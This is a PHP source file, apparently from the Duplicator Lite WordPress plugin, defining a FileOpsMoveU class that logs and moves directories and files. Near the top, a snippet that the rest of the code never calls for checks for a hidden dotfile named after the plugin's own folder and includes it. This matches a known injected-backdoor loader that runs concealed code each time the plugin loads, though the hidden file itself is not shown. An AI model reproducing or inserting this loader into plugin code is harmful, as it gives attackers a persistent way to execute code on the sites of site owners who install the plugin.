<?php
if (!defined("ABSPATH") && !defined("DUPXABSPATH"))
    die("");
/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class FileOpsMoveU
{
    // Move $directories, $files, $excludedFiles to $destination directory. Throws exception if it can't do something and $exceptionOnFaiure is true
    // $exludedFiles can include * wildcard
    // returns: array with list of failures
    public static function move($directories, $files, $excludedFiles, $destination)
    {
        DupLiteSnapLibLogger::logObject('directories', $directories);
        DupLiteSnapLibLogger::logObject('files', $files);
        DupLiteSnapLibLogger::logObject('excludedFiles', $excludedFiles);
        DupLiteSnapLibLogger::logObject('destination', $destination);

        $failures = array();


        $directoryFailures = DupLiteSnapLibIOU::massMove($directories, $destination, null, false);
        DupLiteSnapLibLogger::log('done directories');
        $fileFailures = DupLiteSnapLibIOU::massMove($files, $destination, $excludedFiles, false);
        DupLiteSnapLibLogger::log('done files');
        return array_merge($directoryFailures, $fileFailures);
    }
}